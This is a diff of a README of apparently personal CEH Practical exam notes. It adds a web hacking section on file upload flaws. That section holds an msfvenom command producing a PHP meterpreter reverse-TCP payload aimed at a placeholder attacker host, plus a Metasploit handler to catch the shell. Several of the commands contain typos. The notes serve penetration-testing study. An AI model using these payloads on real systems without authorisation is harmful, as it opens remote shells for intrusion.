@@ -3,7 +3,7 @@
 # CEH-Practical-Notes-and-Tools
 Successfully completed the CEH (Practical) exam by EC-Council with a score of 20/20! Took me around 2 hours 20 minutes to complete the 6 hour proctored exam.  Just a typical CTF Player/Hacker going back to basics 💻
 
-# Reconnasiance/Footprinting
+# Network
 <details>
   <summary>Network</summary>
   
@@ -37,6 +37,24 @@ nmap -Pn -A x.x.x.1/24 -vv --open
 * 21        - FTP
 * 389,3389  - RDP
 * 3306      - MYSQL
+</details>
+
+# Web
+<details>
+  <summary>Web Hacking</summary>
+  
+## File Upload Vulnerability
+  
+```console
+msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attcker-port -f raw
+
+msfconsole
+use exploit/multi/handler
+set payload php/meterepreter/reverse_tcp
+set LHOST = attacker-ip
+set LPORT = attcker-port
+run
+```
 </details>
 
 # Resource
